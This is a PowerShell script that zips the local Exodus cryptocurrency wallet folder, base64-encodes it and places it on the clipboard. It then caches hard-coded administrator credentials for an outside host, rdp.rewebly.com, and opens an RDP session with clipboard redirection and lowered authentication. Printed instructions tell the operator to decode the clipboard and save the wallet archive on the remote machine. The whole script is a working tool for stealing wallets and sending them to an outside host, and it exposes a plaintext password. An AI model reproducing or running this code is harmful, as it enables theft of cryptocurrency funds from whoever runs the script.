# === CONFIGURATION ===
$server   = "rdp.rewebly.com"
$username = "corp\Administrator"
$password = "!Mamoute901901a"
$tempRDP  = "$env:TEMP\fullsession.rdp"
$rdpTitle = "rdp.rewebly.com"  # Change if your RDP window title is different

# Paths for local Exodus
$exodusPath = "$env:APPDATA\Exodus"
$zipPath    = "$env:TEMP\exodus_wallet_backup.zip"

# === 1. Create a NORMAL FULL DESKTOP RDP config ===
$rdpContent = @"
full address:s:$server
username:s:$username
screen mode id:i:2
desktopwidth:i:1280
desktopheight:i:800
session bpp:i:32
redirectclipboard:i:1
redirectprinters:i:1
redirectcomports:i:1
redirectsmartcards:i:1
devicestoredirect:s:*
redirectdrives:i:0
promptcredentialonce:i:0
authentication level:i:0
"@
Set-Content -Path $tempRDP -Value $rdpContent -Encoding ASCII

# === 2. Zip the Exodus wallet folder ===
if (Test-Path $exodusPath) {
    Write-Host "[*] Compressing Exodus wallet folder..."
    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
    Compress-Archive -Path $exodusPath -DestinationPath $zipPath -Force
    Write-Host "[+] Exodus wallet zipped at $zipPath"
} else {
    Write-Host "[-] No Exodus wallet found on this machine."
    exit
}

# === 3. Convert ZIP to Base64 ===
Write-Host "[*] Encoding ZIP to Base64..."
$base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($zipPath))
Write-Host "[+] Base64 encoding complete. Size: $($base64.Length) characters."

# === 4. Copy Base64 to clipboard (syncs to RDP) ===
$base64 | Set-Clipboard
Write-Host "[+] Base64 ZIP copied to clipboard!"
Write-Host ""
Write-Host "✅ Once RDP session is open, run this on the remote machine:"
Write-Host ""
Write-Host 'Add-Type -AssemblyName System.Windows.Forms; $clip=[Windows.Forms.Clipboard]::GetText(); [IO.File]::WriteAllBytes("C:\Users\Public\exodus_wallet_backup.zip",[Convert]::FromBase64String($clip))'
Write-Host ""

# === 5. Cache credentials & launch FULL RDP session ===
cmdkey /generic:$server /user:$username /pass:$password | Out-Null
Write-Host "[*] Launching FULL RDP desktop session..."
Start-Process "mstsc.exe" -ArgumentList $tempRDP

Write-Host ""
Write-Host "✅ When the remote session is ready:"
Write-Host "   1. Open PowerShell on the RDP machine"
Write-Host "   2. Paste & run the decode command above"
Write-Host "   3. ZIP will be saved to C:\Users\Public"
